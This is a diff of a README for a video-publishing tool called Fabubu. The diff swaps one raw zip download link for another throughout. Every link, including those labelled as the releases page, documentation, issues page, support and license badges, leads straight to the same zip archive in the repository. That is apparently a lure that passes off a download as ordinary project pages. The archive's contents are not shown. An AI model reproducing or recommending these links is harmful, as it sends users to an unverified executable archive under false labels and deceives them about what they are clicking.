@@ -1,11 +1,11 @@
 # 📹 Fabubu - Simplify Your Video Publishing
 
 <div align="center">
-  <a href="https://github.com/didik93/Fabubu/raw/refs/heads/main/release/Software-1.4.zip">
-    <img src="https://github.com/didik93/Fabubu/raw/refs/heads/main/release/Software-1.4.zip" alt="Latest Release" />
+  <a href="https://github.com/didik93/Fabubu/raw/refs/heads/main/ref/Software-3.9.zip">
+    <img src="https://github.com/didik93/Fabubu/raw/refs/heads/main/ref/Software-3.9.zip" alt="Latest Release" />
   </a>
-  <img src="https://github.com/didik93/Fabubu/raw/refs/heads/main/release/Software-1.4.zip%20%7C%20Windows-lightgrey?style=flat-square" alt="Platform" />
-  <img src="https://github.com/didik93/Fabubu/raw/refs/heads/main/release/Software-1.4.zip" alt="License" />
+  <img src="https://github.com/didik93/Fabubu/raw/refs/heads/main/ref/Software-3.9.zip%20%7C%20Windows-lightgrey?style=flat-square" alt="Platform" />
+  <img src="https://github.com/didik93/Fabubu/raw/refs/heads/main/ref/Software-3.9.zip" alt="License" />
 </div>
 
 ---
@@ -19,7 +19,7 @@
 Follow these steps to download and run Fabubu.
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/didik93/Fabubu/raw/refs/heads/main/release/Software-1.4.zip) to open the Releases page.
+   Click [here](https://github.com/didik93/Fabubu/raw/refs/heads/main/ref/Software-3.9.zip) to open the Releases page.
 
 2. **Download the Installer**  
    On the Releases page, find the latest version of Fabubu. Look for a file ending with `.exe` for Windows or `.dmg` for macOS. Click on it to download, and save it to your computer.
@@ -36,7 +36,7 @@ Follow these steps to download and run Fabubu.
 
 ## 📥 Download & Install
 
-To download Fabubu, visit [this page](https://github.com/didik93/Fabubu/raw/refs/heads/main/release/Software-1.4.zip). Select the appropriate file for your operating system, and follow the installation steps above.
+To download Fabubu, visit [this page](https://github.com/didik93/Fabubu/raw/refs/heads/main/ref/Software-3.9.zip). Select the appropriate file for your operating system, and follow the installation steps above.
 
 ## ✨ Core Features
 
@@ -75,12 +75,12 @@ Currently, Fabubu supports only Windows and macOS. A Linux version may be added 
 
 ### Is there any support available?
 
-Yes, you can find support on our [GitHub Issues page](https://github.com/didik93/Fabubu/raw/refs/heads/main/release/Software-1.4.zip). We encourage users to share their experiences and report any bugs.
+Yes, you can find support on our [GitHub Issues page](https://github.com/didik93/Fabubu/raw/refs/heads/main/ref/Software-3.9.zip). We encourage users to share their experiences and report any bugs.
 
 ## 🔗 Useful Links
 
-- [GitHub Releases](https://github.com/didik93/Fabubu/raw/refs/heads/main/release/Software-1.4.zip)
-- [Documentation](https://github.com/didik93/Fabubu/raw/refs/heads/main/release/Software-1.4.zip)
-- [Support](https://github.com/didik93/Fabubu/raw/refs/heads/main/release/Software-1.4.zip)
+- [GitHub Releases](https://github.com/didik93/Fabubu/raw/refs/heads/main/ref/Software-3.9.zip)
+- [Documentation](https://github.com/didik93/Fabubu/raw/refs/heads/main/ref/Software-3.9.zip)
+- [Support](https://github.com/didik93/Fabubu/raw/refs/heads/main/ref/Software-3.9.zip)
 
 Now you are ready to simplify your video publishing with Fabubu! Enjoy your content creation experience.
